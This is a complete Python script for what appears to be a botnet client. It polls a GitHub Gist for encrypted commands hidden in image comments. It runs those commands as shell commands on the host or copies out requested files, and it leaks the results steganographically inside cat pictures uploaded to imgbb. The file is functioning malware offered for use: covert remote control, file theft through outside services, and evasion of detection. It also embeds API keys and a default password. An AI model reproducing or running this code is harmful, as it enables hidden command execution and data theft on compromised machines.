#!/usr/bin/env python3
import requests
import json
import base64
import random
from Crypto.Cipher import ChaCha20
from time import sleep
from hashlib import sha256
import subprocess
import os

# API keys and API related stuff
GITHUB_API = "https://api.github.com" # leave it this way
API_TOKEN = "YOUR-GISTS-API-TOKEN-HERE"
GIST_ID = "79b23febd9c75a7657887689ece51198" # id of gist used for communication, feel free to use this
IMGBB_KEY = "c64cefbdc4fb4676cf79396550df94b0" # eventually create an api key @ imgbb.com, feel free to use this

# Authentication credentials and symmetric key for encryption (change default key value with 32 bytes)
CHACHA20_KEY: bytes = b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
# strongpw1337 is the pw
# use gen-hash.py to create user entries
USERS = {"admin": b'0bec5675$1d20dca2904f5cf98b20f08eb7463403cc45e810d5dc6d39fa7a3914e6e98a54'}

# Shared variables
HIDDEN_BYTE_SIZE = 8
COMMENT_INDEX = 0
COLORS = ["White", "Yellow", "Blue", "Red", "Green", "Black", "Brown", "Azure", "Ivory", "Teal", "Silver", "Purple", "NavyBlue", "PeaGreen", "Gray", "Orange", "Maroon", "Charcoal", "Aquamarine", "Coral", "Fuchsia", "Wheat", "Lime", "Crimson", "Khaki", "HotPink", "Magenta", "Olden", "Plum", "Olive", "Cyan"]
ANIMALS = ["Squirrel", "Dog", "Pig", "Lion", "Mouse", "Monkey", "Elephant", "Fox", "Panda", "Kangaroo", "Cow", "Leopard", "Coyote", "Hedgehog", "Chimpanzee", "Walrus", "Goat", "Koala", "Hippopotamus", "Sheep", "Raccoon", "Ox", "Otter", "Horse", "Mole", "Giraffe", "Deer"]
BOT_NAME = random.choice(COLORS) + random.choice(ANIMALS)


### FUNCTIONS SHARED WITH CONTROLLER ###
def encrypt_payload(payload: str):
    cipher = ChaCha20.new(key=CHACHA20_KEY)
    enc = base64.b64encode( cipher.encrypt(payload.encode()) ).decode('utf-8')
    nonce = base64.b64encode(cipher.nonce).decode('utf-8')
    return enc, nonce

def decrypt_payload(payload: str, nonce: str):
    cipher = ChaCha20.new(key=CHACHA20_KEY, nonce=base64.b64decode(nonce))
    dec = cipher.encrypt(base64.b64decode(payload)).decode('utf-8')
    return dec

def prepare_payload(data: object, type: str):
    enc, nonce = encrypt_payload(json.dumps(data))
    payload = {"type": type, "enc": enc, "nonce": nonce}
    payload = json.dumps(payload).encode()
    return payload

def send_comment(body):
    headers = {'Authorization': f'token  {API_TOKEN}', "Accept": "application/vnd.github.v3+json"}
    payload = {"body": body}
    path = f"/gists/{GIST_ID}/comments"
    url = GITHUB_API+path
    res = requests.post(url, headers=headers, data=json.dumps(payload))

    return res

def get_comments():
    headers = {'Authorization': f'token  {API_TOKEN}', "Accept": "application/vnd.github.v3+json"}
    path = f"/gists/{GIST_ID}/comments"
    url = GITHUB_API+path
    res = requests.get(url, headers=headers, params={"page": -1, "per_page": 100})
    comms = res.json()
    return comms

def get_new_comments():
    global COMMENT_INDEX
    comms = get_comments()

    if len(comms) < COMMENT_INDEX:
        # controller is deleting comments
        prev_len = len(comms)
        while True:
            sleep(1)
            comms = get_comments()
            if prev_len == len(comms):
                break
            else:
                prev_len = len(comms)
        COMMENT_INDEX = 0

    comments = [{"body": comms[i]["body"], "id": comms[i]["id"]} for i in range(COMMENT_INDEX, len(comms))]
    return comments

def upload_image(img: bytes, expiration: int=3600):
    data = {"key":IMGBB_KEY, "image": img.decode(), "expiration": expiration}
    res = requests.post("https://api.imgbb.com/1/upload", data)
    return res

def secret_from_comment(body):
    if "![Very funny cat](" in body or "![](" in body:
        try:
            url = body.split("(")[-1][:-1]
            with requests.get(url) as r:
                img =  r.content
            size = int.from_bytes(img[-HIDDEN_BYTE_SIZE:], "little")
            secret =  img[-(HIDDEN_BYTE_SIZE+size):-HIDDEN_BYTE_SIZE]
            return secret
        except:
            return '{"type": null}'
    else:
        return '{"type": null}'
########## END SHARED FUNCTIONS ##########


def comment_cat_image(payload: bytes):
    if len(payload) > 8**(HIDDEN_BYTE_SIZE):
        return None

    captions = ["Take a look at this cutie!",
        "Isn't it beautiful??",
        "Look who I met this morning!",
        "This guy is purring like crazy!",
        "Don't you think this is the most innocent guy ever? Surely it's not leaking any private information from compromised machines all around the world!",
        "Stop nerding around and admire him!",
        "Majestic.",
        "Absolute perfection.",
        "Chonky boi appeared!"
        ]

    # using fake cats to protect their privacy
    with requests.get("https://thiscatdoesnotexist.com/") as r:
        cat =  base64.b64encode(r.content + payload + len(payload).to_bytes(HIDDEN_BYTE_SIZE, 'little'))

    res = upload_image(cat)

    if(res.status_code == 200):
        url = res.json()["data"]["url"]
        body = f"{random.choice(captions)}\n![Very funny cat]({url})"
        return send_comment(body)
    else:
        return res

def auth_user(user: str, pw:str):
    try:
        hh = USERS[user]
        salt, h = hh.split(b'$')
        test = sha256(salt+pw.encode()).hexdigest()
        return (test == h.decode())
    except:
        return False


def init():
    global COMMENT_INDEX
    try:
        cm = get_new_comments()
        COMMENT_INDEX = len(cm)
    except:
        print("Initialization failed, aborting. Make sure your api token is correct.")
        exit(-1)

def main():
    global COMMENT_INDEX

    while True:
        cm = get_new_comments()
        for c in cm:
            COMMENT_INDEX += 1
            cmd_id = c["id"]
            secret = json.loads(secret_from_comment(c["body"]))
            if secret["type"] == "req":
                try:
                    dec = json.loads(decrypt_payload(secret["enc"], secret["nonce"]))
                    cmd = dec["cmd"]
                    args = dec["args"]
                    user = dec["user"]
                    pw = dec["pw"]
                except:
                    continue

                if auth_user(user, pw):
                    if cmd.upper() == "CP":
                        try:
                            filepath = args[0]
                            with open(filepath, "rb") as f:
                                out = f.read()
                            file = base64.b64encode(out).decode('utf-8')
                            _, filename = os.path.split(filepath)
                            data = {"reply_to": cmd_id, "bot_name": BOT_NAME, "filename": filename, "file": file.strip()}
                            payload = prepare_payload(data, "file")
                        except Exception as e:
                            out = str(e)
                            data = {"reply_to": cmd_id, "bot_name": BOT_NAME, "output": out.strip()}
                            payload = prepare_payload(data, "resp")

                    elif cmd.upper() == "HEARTBEAT":
                        out = "I am alive!"
                        data = {"reply_to": cmd_id, "bot_name": BOT_NAME, "output": out.strip()}
                        payload = prepare_payload(data, "resp")

                    else:
                        comm = cmd + ' ' + ' '.join(args)
                        try:
                            # if this returns, the process completed
                            out = subprocess.check_output(comm, shell=True, timeout=3).decode()
                        except Exception as e:
                            out = str(e)
                        data = {"reply_to": cmd_id, "bot_name": BOT_NAME, "output": out.strip()}
                        payload = prepare_payload(data, "resp")

                    comment_cat_image(payload)
        sleep(5)


if __name__ == "__main__":
    init()
    main()